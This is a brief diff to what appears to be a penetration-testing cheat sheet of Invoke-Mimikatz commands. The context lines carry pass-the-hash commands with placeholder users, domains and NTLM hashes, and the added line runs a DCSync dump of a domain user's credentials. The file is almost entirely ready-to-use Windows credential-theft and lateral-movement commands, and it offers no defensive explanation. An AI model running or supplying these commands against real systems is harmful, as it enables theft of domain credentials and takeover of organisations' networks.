@@ -15,3 +15,4 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Moe /domain:Security.local /ntlm:
 
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Jerome /domain:MAYIRUDC.com /ntlm:HASH /run:"YourCommand"''
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Jerome /domain:MAYIRUDC.com /ntlm:HASH /run:powershell.exe -Command "YourPowerShellCommand"''
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\USER"'
